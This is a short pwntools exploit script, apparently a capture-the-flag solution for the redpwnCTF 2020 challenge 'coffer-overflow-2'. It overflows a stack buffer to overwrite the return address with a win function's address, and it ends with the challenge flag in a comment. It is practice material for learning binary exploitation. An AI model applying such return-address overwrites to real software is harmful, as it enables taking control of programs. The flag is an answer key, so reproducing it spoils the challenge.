from pwn import *
import sys

if len(sys.argv) < 2:
	r = process('./coffer-overflow-2')
	raw_input('debug')
else:
	host, port = '2020.redpwnc.tf', 31908
	r = remote(host, port)

func_add = 0x4006e6 

buf = 'a'*24 + p64(func_add)
r.sendlineafter('What do you want to fill your coffer with?', buf)

r.interactive()
r.close()

# flag{ret_to_b1n_m0re_l1k3_r3t_t0_w1n}